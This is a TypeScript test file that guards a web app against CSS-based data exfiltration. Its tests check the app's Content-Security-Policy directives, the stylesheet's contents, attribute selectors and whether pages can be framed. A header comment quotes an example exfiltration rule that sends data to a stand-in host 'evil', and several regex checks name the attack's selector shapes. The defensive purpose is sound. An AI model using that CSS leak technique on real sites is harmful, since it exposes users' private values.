import assert from 'node:assert/strict'
import { test } from 'node:test'

import { discoverPageHtml } from './discover.js'
import { verifyEndpoints } from './endpoints.js'
import { verifyPageHtml } from './page.js'
import { STYLES } from './styles.js'

// CSS EXFILTRATES WITHOUT JAVASCRIPT. The attack is an attribute selector
// paired with a request: `[data-x^="a"] { background: url(https://evil/a) }`
// leaks a value one character at a time, and a CSP that permits scripts but
// forgets images does nothing about it. These pages carry class names and
// content hashes, and one of them is opened by a child.
//
// What makes it inert here is that CSS can initiate no request of any kind.
// That is currently true; these tests are what keep it true, because it would
// stop being true the day somebody adds a background image and widens img-src
// to allow it.

const pages = [verifyPageHtml(), discoverPageHtml()]

const policy = async () => {
  const doc = verifyEndpoints().find((e) => !e.path.endsWith('/data'))!
  const response = (await doc.handler({ url: 'http://x/api/p' } as never)) as Response
  return response.headers.get('content-security-policy') ?? ''
}

const directives = (csp: string) =>
  Object.fromEntries(
    csp
      .split(';')
      .map((part) => part.trim())
      .filter(Boolean)
      .map((part) => {
        const [name, ...values] = part.split(/\s+/)
        return [name!, values.join(' ')]
      }),
  )

test('nothing CSS could ask for is permitted to load', async () => {
  // img-src, font-src and media-src are the channels. None is stated, so each
  // falls back to default-src, which is 'none'. A background: url() is
  // therefore not merely unused — it cannot fire.
  const found = directives(await policy())

  assert.equal(found['default-src'], "'none'")
  for (const channel of ['img-src', 'font-src', 'media-src', 'object-src']) {
    assert.equal(found[channel], undefined, `${channel} is stated, so it no longer falls back to none`)
  }
})

test('connect-src is the only outbound directive, and it is same-origin', async () => {
  const found = directives(await policy())

  const outbound = Object.entries(found).filter(
    ([name, value]) => name.endsWith('-src') && value !== "'none'" && name !== 'script-src' && name !== 'style-src',
  )

  assert.deepEqual(outbound, [['connect-src', "'self'"]])
})

test('the stylesheet asks for nothing', () => {
  // Belt as well as braces: even with the CSP, a url() in here would be a
  // request somebody intended, and intent is what drifts.
  assert.ok(!/url\(/i.test(STYLES), 'the stylesheet loads something')
  assert.ok(!/@import/i.test(STYLES))
  assert.ok(!/\bsrc:\s/i.test(STYLES), 'a font is being fetched')
})

test('no page carries an inline style attribute', () => {
  // A style attribute is where injected content becomes CSS.
  for (const page of pages) {
    assert.ok(!/\sstyle="/.test(page), 'a page carries a style attribute')
  }
})

test('no page writes CSS from script', () => {
  for (const page of pages) {
    assert.ok(!/\.style\./.test(page), 'a page sets style properties from script')
    assert.ok(!/cssText|setProperty|insertRule/.test(page))
  }
})

test('every attribute CSS selects on carries a bounded value', () => {
  // data-state and data-ok are read by attribute selectors. If either ever
  // carried a server string — a class name, a hash — an attribute selector
  // could match it character by character. They carry the stringified form of
  // a tri-state and nothing else.
  for (const page of pages) {
    for (const match of page.matchAll(/dataset\.(\w+)\s*=\s*([^\n]+)/g)) {
      const assigned = match[2]!.trim()
      assert.match(
        assigned,
        /^String\((?:state|step\.ok|entry\.eligible|checked\.verdict)\)$/,
        `dataset.${match[1]} is assigned ${assigned}, which may not be bounded`,
      )
    }
  }
})

test('the selectors CSS uses match a fixed set, not a prefix', () => {
  // A prefix or substring selector — [data-x^="…"], [data-x*="…"] — is the
  // shape an exfiltration uses. Exact-match only here.
  const risky = [...STYLES.matchAll(/\[[\w-]+[\^$*~|]=/g)].map((m) => m[0])

  assert.deepEqual(risky, [], 'a prefix or substring attribute selector is present')
})

test('a page cannot be framed, so its CSS cannot be overlaid', () => {
  // Clickjacking is the other half: a page that can be framed can have its
  // controls covered by somebody else's stylesheet.
  return policy().then((csp) => {
    const found = directives(csp)
    assert.equal(found['frame-ancestors'], "'none'")
    assert.equal(found['base-uri'], "'none'", 'a base tag could redirect every relative URL')
  })
})
